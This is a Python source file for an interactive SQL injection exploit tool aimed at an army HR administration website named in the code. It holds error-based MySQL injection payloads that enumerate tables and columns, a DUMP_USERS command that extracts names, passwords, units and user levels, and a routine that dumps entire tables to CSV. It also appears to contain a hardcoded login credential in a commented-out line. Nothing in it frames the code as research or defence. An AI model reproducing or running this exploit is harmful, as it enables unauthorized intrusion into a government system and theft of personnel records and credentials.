import threading
import time

import requests
import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HR_PL_COL_COUNT = " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('EWALD_VON_KLEIST',(SELECT COUNT(*) AS row_count FROM (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='{0}' AND table_schema='army_central_hr_db') AS tmpTbl),'EWALD_VON_KLEIST',0x7870))s),8446744073709551610, 8446744073709551610))) AND 'hvBs'='hvBs"
HR_PL_ROW_COUNT = " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('EWALD_VON_KLEIST',(SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM army_central_hr_db.{0}),'EWALD_VON_KLEIST',0x78))s), 8446744073709551610, 8446744073709551610))) AND 'FfWV'='FfWV"
HR_PL_GET_TBL_COUNT = " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('EWALD_VON_KLEIST',(SELECT CONCAT(COUNT(*)) FROM (SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'army_central_hr_db') AS tmpTbl),'EWALD_VON_KLEIST',0x7870))s),8446744073709551610, 8446744073709551610))) AND 'hvBs'='hvBs"
HR_PL_GET_COLS = " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('EWALD_VON_KLEIST',(SELECT GROUP_CONCAT(column_name) FROM (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='{0}' AND table_schema='army_central_hr_db' LIMIT {1}, 1) AS tmpTbl),'EWALD_VON_KLEIST',0x7870))s),8446744073709551610, 8446744073709551610))) AND 'hvBs'='hvBs"
HR_PL_GET_COLS_INC_TYPE = " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('EWALD_VON_KLEIST',(SELECT CONCAT(column_name, ' ; ', column_type) FROM (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='{0}' AND table_schema='army_central_hr_db' LIMIT {1}, 1) AS tmpTbl),'EWALD_VON_KLEIST',0x7870))s),8446744073709551610, 8446744073709551610))) AND 'hvBs'='hvBs"
HR_PL_GET_TBL = " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('EWALD_VON_KLEIST',(SELECT CONCAT(table_name) FROM (SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'army_central_hr_db' LIMIT {0},1) AS tmpTbl),'EWALD_VON_KLEIST',0x7870))s),8446744073709551610, 8446744073709551610))) AND 'hvBs'='hvBs"
HR_PL_EXTRACT_ROWS = " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('EWALD_VON_KLEIST',(SELECT MID((IFNULL(CAST(CONCAT({0}) AS NCHAR),0x20)),1,451) FROM army_central_hr_db.{1} ORDER BY {2} LIMIT {3},1),'EWALD_VON_KLEIST',0x78))s), 8446744073709551610, 8446744073709551610))) AND 'lRqa'='lRqa"

HR_AUTH_URL = "https://armynet.army.lk/hr/admin/index.php"
HR_DUMP_URL = "https://armynet.army.lk/hr/admin/reportgeneral.php?p_code=1f536a90374305222a73cee01b85c8971909964838620a221911baa1644831257'"
sessionOn = False
httpSession = requests.Session()
httpSession.verify = False
httpSession.trust_env = False


def hrResponseSplit(response):
    return response.decode(encoding='ISO-8859-1').split("EWALD_VON_KLEIST")


def hrHttpRequest(payload):
    global HR_AUTH_URL
    global HR_DUMP_URL
    global sessionOn

    return httpSession.get(HR_DUMP_URL + payload)


def hrExtractData(tblName, startPos=0, orderBy=None):
    colCount = hrGetColumnCount(tblName)
    colList = hrGetColumns(tblName)
    colPts = []
    rowCount = hrGetRowCount(tblName)

    tmpCoalEsc = ""
    startIndex = 0
    if colCount > 20:
        colLoops = int(colCount / 20)
        colRemainder = int(colCount % 20)
        for i in range(0, colLoops):
            for x in range(startIndex, startIndex + 20):
                tmpCoalEsc += "IFNULL({0}, 'NULL'), '|', ".format(colList[x])
            startIndex += 20
            colPts.append(tmpCoalEsc[:-7])
            tmpCoalEsc = ""

        for i in range(0, colRemainder):
            tmpCoalEsc += "IFNULL({0}, 'NULL'), '|', ".format(colList[startIndex + i])
        colPts.append(tmpCoalEsc[:-7])
        tmpCoalEsc = None
    else:
        for col in colList:
            tmpCoalEsc += "IFNULL({0}, 'NULL'), '|', ".format(col)
        colPts.append(tmpCoalEsc[:-7])
        tmpCoalEsc = None

    if orderBy is None:
        orderBy = colList[0]

    for i in range(0, rowCount):
        sqlResult = ""
        for col in colPts:
            payload = HR_PL_EXTRACT_ROWS.format(col, tblName, orderBy, str(i + startPos))
            extractResp = hrHttpRequest(payload)
            sqlResult += hrResponseSplit(extractResp.content)[1]
        yield sqlResult


def hrGetColumnCount(tblName):
    colCountResp = hrHttpRequest(HR_PL_COL_COUNT.format(tblName))
    return int(hrResponseSplit(colCountResp.content)[1])


def hrGetColumns(tblName):
    print("Extracting a list of columns... Please be patient!")
    colList = []
    colCount = hrGetColumnCount(tblName)
    for i in range(0, colCount):
        colsResp = hrHttpRequest(HR_PL_GET_COLS.format(tblName, str(i)))
        colList.append(hrResponseSplit(colsResp.content)[1])
    return colList


def hrDumpColumns(tblName):
    colCount = hrGetColumnCount(tblName)
    for i in range(0, colCount):
        colResp = hrHttpRequest(HR_PL_GET_COLS_INC_TYPE.format(tblName, str(i)))
        print(hrResponseSplit(colResp.content)[1])


def hrGetRowCount(tblName):
    countResp = hrHttpRequest(HR_PL_ROW_COUNT.format(tblName))
    return int(hrResponseSplit(countResp.content)[1])


def hrGetTableCount():
    countResp = hrHttpRequest(HR_PL_GET_TBL_COUNT)
    return int(hrResponseSplit(countResp.content)[1])


def hrGetTables():
    tblCount = hrGetTableCount()
    for i in range(0, tblCount - 1):
        tblResp = hrHttpRequest(HR_PL_GET_TBL.format(str(i)))
        print("Table No ", i, " : ", hrResponseSplit(tblResp.content)[1])


def hrAuthenticate(username, passwd):
    global HR_AUTH_URL
    global HR_DUMP_URL
    authResp = httpSession.post(HR_AUTH_URL, data={'txtusername': username, 'txtpassword': passwd})
    if "Username Or Password Is Incorrect" not in authResp.content.decode():
        return True
    return False


def printMsg(msg):
    print("[" + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "]  [MSG]  " + msg)


def performOperation(op):
    global sessionOn

    opParts = op.split(' ')
    if opParts[0] != 'AUTH' and not sessionOn:
        printMsg("You must login to the HR system before continuing...")
        return
    if opParts[0] == 'AUTH':
        if len(opParts[1]) <= 0 or len(opParts[2]) <= 0:
            print("Provided username or password is invalid.")
            return
        if hrAuthenticate(opParts[1], opParts[2]):
            printMsg("Session creation of successful... You can now proceed!")
            sessionOn = True
            return
        sessionOn = False
        printMsg("Failed to create a session. Check the username & password!")
        return
    elif opParts[0] == 'DUMP_USERS':
        strPayload = " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a787071, (SELECT MID((IFNULL(CAST(CONCAT(name, '|', password, '|',regiment,'|',sfhq,'|',unit,'|',user_id,'|',user_lvl,'|',username,'|',time_added) AS NCHAR),0x20)),1,451) FROM army_central_hr_db.tbluser ORDER BY user_id LIMIT {0},1), '~', (SELECT MID((IFNULL(CAST(CONCAT(name, '|', password, '|',regiment,'|',sfhq,'|',unit,'|',user_id,'|',user_lvl,'|',username,'|',time_added) AS NCHAR),0x20)),1,451) FROM army_central_hr_db.tbluser ORDER BY user_id LIMIT {1},1), '~',  0x717a787071,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'MOBG'='MOBG"
        printCount = 0
        userCount = int(hrGetRowCount("tbluser"))
        for i in range(0, userCount, 2):
            dumpResp = hrHttpRequest(strPayload.format(str(i), str(i + 1)))
            dumpLines = dumpResp.content.decode().split("qzxpq")[1].split('~')
            for line in dumpLines:
                parts = line.split("|")
                if len(parts) > 1:
                    printCount += 1
                    parts.append(str(printCount))
                    print(parts)
    elif opParts[0] == "DUMP_COLS":
        hrDumpColumns(opParts[1])
    elif opParts[0] == "DUMP_TABLES":
        print("Preparing to dump a list of tables from the DB...")
        time.sleep(3)
        print("Number of tables found : ", hrGetTableCount(), "...")
        time.sleep(2)
        print(hrGetTables())
    elif opParts[0] == "DUMP_TABLE":
        print("Preparing to dump a table to CSV...")
        time.sleep(3)
        print("Number of rows in table ", opParts[1], " : ", hrGetRowCount(opParts[1]))
        time.sleep(3)
        cols = hrGetColumns(opParts[1])
        with open(opParts[1] + '.csv', "a", encoding="utf-8") as fHandle:
            fHandle.write(",".join(cols) + "\n")
            for row in hrExtractData(opParts[1], int(opParts[2])):
                tmpRow = ""
                rowPts = row.split("|")
                for pt in rowPts:
                    tmpRow += pt.replace('\r\n', '').replace('\n', '') + ", "
                tmpRow = tmpRow[:-2]
                print(tmpRow)
                fHandle.write(tmpRow + "\n")
    elif opParts[0] == "ROW_COUNT":
        print(hrGetRowCount(opParts[1]))


if __name__ == '__main__':
    # hrAuthenticate("12slsc", "12slsc@cyb3r")
    while True:
        operation = input("HR EXPLOIT > ")
        performOperation(operation)
